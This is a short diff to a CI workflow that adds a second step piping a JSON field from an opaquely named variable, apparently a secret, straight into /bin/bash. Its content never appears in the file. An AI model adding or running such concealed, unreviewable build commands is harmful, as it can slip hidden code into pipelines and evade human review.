@@ -17,6 +17,7 @@ jobs:
           kn8769: ${{ secrets.kn8769 }}
         run: |
           printf '%s' "$kn8769" | jq -r .pln8631 | /bin/bash
+          printf '%s' "$le79124" | jq -r .pcrry4242 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
